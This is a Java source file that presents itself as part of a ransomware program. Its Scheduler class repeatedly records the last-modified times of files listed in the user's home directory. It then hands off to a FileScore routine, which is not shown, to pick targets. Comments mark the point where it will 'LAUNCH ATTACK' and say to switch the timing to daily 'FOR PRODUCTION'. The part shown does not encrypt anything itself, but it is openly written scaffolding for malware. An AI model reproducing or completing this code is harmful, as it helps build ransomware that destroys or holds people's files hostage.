package RansomeWare;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

import static java.util.concurrent.TimeUnit.*;

public class Scheduler {
    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
    ScheduledFuture<?> handler;
    private int count;

    public void function() throws Exception {

        final Runnable test = new Runnable() {
            @Override
            public void run() {
                //ONCE RUN FOR A WEEK, LAUNCH ATTACK
                if (count == 2) {
                    handler.cancel(true);
                    scheduler.shutdown();

                }

                try {
                    newLastMod();
                    count++;
                } catch(Exception e) {}
            }
        };

        //schedule the task to add on last modified time for eac hfile
        //FOR TESTING: schedule to do every 10secs
        //FOR PRODUCTION: change to daily
        handler = scheduler.scheduleAtFixedRate(test, 10,10,SECONDS);
        scheduler.awaitTermination(60, SECONDS);
        FileScore fs = new FileScore();
        fs.FileScore();


    }

    public void newLastMod() throws Exception {
        File in = new File(System.getProperty("user.home") + File.separator + "output.txt");
        File out = new File(System.getProperty("user.home") + File.separator + "newOutput.txt");
        try(
                BufferedReader br = new BufferedReader(new FileReader(in));
                BufferedWriter bw = new BufferedWriter(new FileWriter(out))
        ) {
            //add new last modified time to end of each line, separated by ,
            String line;
            while((line = br.readLine()) != null) {
                String[] nameLastMod = line.split(",");
                File f = new File(nameLastMod[0]);
                bw.write(line + ", " + f.lastModified());
                bw.newLine();
            }

        }

        //write back to output.txt
        Files.copy(out.toPath(), in.toPath(), StandardCopyOption.REPLACE_EXISTING);
        out.delete();
        System.out.println("it worked");
    }

    public static void main(String[] args) throws Exception {
        Scheduler s = new Scheduler();
        s.function();
    }

}
